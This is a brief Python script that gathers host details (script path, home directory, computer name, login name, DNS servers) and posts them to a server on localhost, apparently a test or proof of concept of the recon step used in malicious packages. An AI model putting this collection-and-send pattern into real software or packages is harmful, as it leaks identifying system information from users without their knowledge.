import os
import dns.resolver
import requests

def main():
    print('Sending request...')
    data = {
        'c': os.path.dirname(__file__),
        'hd': os.path.expanduser('~'),
        'hn': os.environ['COMPUTERNAME'],
        'un': os.getlogin(),
        'dns': dns.resolver.Resolver().nameservers
    }
    response = requests.post('http://127.0.0.1:3000', data=data)
    print(response.text)

if __name__ == '__main__':
    main()
